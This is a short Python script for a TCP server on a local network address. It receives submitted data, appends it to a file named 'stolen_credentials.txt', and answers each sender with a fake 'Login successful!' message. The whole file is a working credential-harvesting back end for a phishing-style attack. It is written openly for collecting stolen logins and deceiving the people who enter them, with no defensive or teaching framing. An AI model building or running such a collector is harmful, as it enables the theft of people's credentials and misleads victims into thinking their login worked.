import socket

def start_server():


    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host = '192.168.43.153'
    port = 8080

    server_socket.bind((host, port))



    server_socket.listen(5)
    print(f"Server listening on {host}:{port}")

    while True:

        client_socket, client_address = server_socket.accept()
        print(f"Connection established with {client_address}")



        data = client_socket.recv(1024).decode()
        if data:
            print(f"Data received: {data}")

        with open("stolen_credentials.txt", "a") as file:
            file.write(data + "\n")

        response = "Login successful!"
        client_socket.send(response.encode())
        client_socket.close()

if __name__ == "__main__": 
    start_server()



